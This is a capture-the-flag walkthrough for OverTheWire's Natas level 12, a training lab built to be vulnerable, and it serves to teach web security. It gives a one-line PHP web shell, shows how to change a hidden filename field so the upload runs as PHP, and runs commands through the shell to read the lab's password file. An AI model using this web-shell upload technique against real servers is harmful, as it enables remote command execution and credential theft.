# 🔐 Natas 12 Walkthrough 

  >[!IMPORTANT]
  >📝 The full script with a commented explanation is provided in the `natas12` directory. Feel free to use it while debugging your code. Good luck!

You'll see an upload form that allows uploading an image file. It mentions that it checks the file type.

```html
<form enctype="multipart/form-data" action="index.php" method="POST">
  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
  <input name="uploadedfile" type="file" />
  <input type="submit" value="Upload File" />
</form>
```
***Let's test it.***

## 🐚 Upload a PHP Shell to the Server

Try uploading a `.php` file disguised as an image. Here's a simple payload to retrieve the password:

```php
<?php echo shell_exec($_GET['e'] . ' 2>&1'); ?>
```
### What does this code do?

- `$_GET['e']` retrieves the value of the `e` parameter from the URL query string.  
  Example: If the URL is `script.php?e=ls`, then `$_GET['e']` will be `'ls'`.

- `. ' 2>&1'` appends `' 2>&1'` to the command. This redirects `stderr` (file descriptor 2) to `stdout` (file descriptor 1), so both standard output and error messages are captured together.

- `shell_exec()` executes the complete shell command on the server. It returns the output of the command, including errors (because of `2>&1`).

- `echo` outputs the result of `shell_exec()` to the browser/user.



Save your script as `shell.php` and upload it using the form. However, you'll notice that the server renames the uploaded file to something like `<randomstring>.jpg`. This is a problem because `.jpg` files are not parsed as PHP, so **your code won’t execute.**

To get around this, we need to manipulate the upload request so that the file is saved with a `.php` extension on the server.

### 🛠️ How to change the filename

Inspect the page and look for this hidden input:
```
<input type="hidden" name="filename" value="<YOUR RANDOM STRING HERE>.jpg">
```
***Change it to:***
```
<input type="hidden" name="filename" value="<YOUR RANDOM STRING HERE>.php">
```
This ensures that your uploaded file gets saved as a `.php` file and will be executed by the server.

## 🔎 Getting the natas13 Password

As we know, the passwords are stored in `/etc/natas_webpass/natasX`. We want to read the contents of:

```
/etc/natas_webpass/natas13
```

Clicking on the uploaded file shows this error:
```
Notice: Undefined index: e in /var/www/natas/natas12/upload/r3bkauo8pd.php on line 4
```
As expected bacause we added this variable in our code. This tells us we need to supply a value to the `e` parameter in the URL.

### ✅ Example: Listing directory contents

To list files in the current directory, use the `ls` command via the URL like so:

```
http://natas12.natas.labs.overthewire.org/upload/r3bkauo8pd.php?e=ls
```
If that works, you should see a list of files.

### 🧠 Now use `cat` to read the password file:
```
http://natas12.natas.labs.overthewire.org/upload/r3bkauo8pd.php?e=cat%20/etc/natas_webpass/natas13
```
> [!CAUTION]  
> You **must** use `%20` (URL encoding for space) in the URL. Using a literal space or nothing will result in an error!

If done correctly, you'll be shown the password for **natas13**. 

